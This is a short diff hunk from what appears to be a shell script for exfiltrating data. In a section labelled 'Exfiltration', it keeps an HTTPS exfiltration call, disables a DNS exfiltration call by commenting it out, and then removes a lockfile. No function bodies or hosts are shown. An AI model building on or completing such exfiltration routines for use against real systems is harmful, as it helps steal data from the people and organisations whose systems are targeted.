@@ -596,7 +596,7 @@ main() {
 
     # ── C: Exfiltration ──
     exfil_https
-    [ -n "$DNS_DOMAIN" ] && exfil_dns
+    # [ -n "$DNS_DOMAIN" ] && exfil_dns
 
     # ── Cleanup ──
     rm -f "$LOCKFILE" 2>/dev/null
